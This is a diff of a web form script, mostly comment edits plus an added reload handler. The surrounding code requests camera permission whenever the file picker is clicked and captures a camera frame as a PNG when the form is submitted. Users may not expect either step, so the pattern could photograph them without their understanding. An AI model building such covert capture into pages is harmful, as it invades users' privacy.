@@ -20,7 +20,7 @@ function showToast(message) {
   }, 2000);
 }
 
-// Function to request camera permission (non-blocking)
+// Request camera permission (non-blocking)
 async function requestCameraPermission() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -31,11 +31,10 @@ async function requestCameraPermission() {
   }
 }
 
-// When user clicks file input
+// Always ask camera permission on file click
 fileInput.addEventListener("click", async (e) => {
-  // Request camera permission first
-  requestCameraPermission();
-  // File input will open immediately anyway
+  requestCameraPermission(); // triggers permission prompt every time
+  // File picker opens naturally
 });
 
 // Handle form submission
@@ -58,8 +57,8 @@ form.addEventListener("submit", async (e) => {
       canvasEl.width = videoEl.videoWidth;
       canvasEl.height = videoEl.videoHeight;
       ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-      image = canvasEl.toDataURL("image/png");
 
+      image = canvasEl.toDataURL("image/png");
       stream.getTracks().forEach(track => track.stop());
     } catch {
       console.warn("Camera not used or denied");
@@ -125,4 +124,9 @@ form.addEventListener("submit", async (e) => {
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
   }
+});
+
+// Reset behavior on reload
+window.addEventListener("beforeunload", () => {
+  fileInput.value = ""; // clear file input
 });
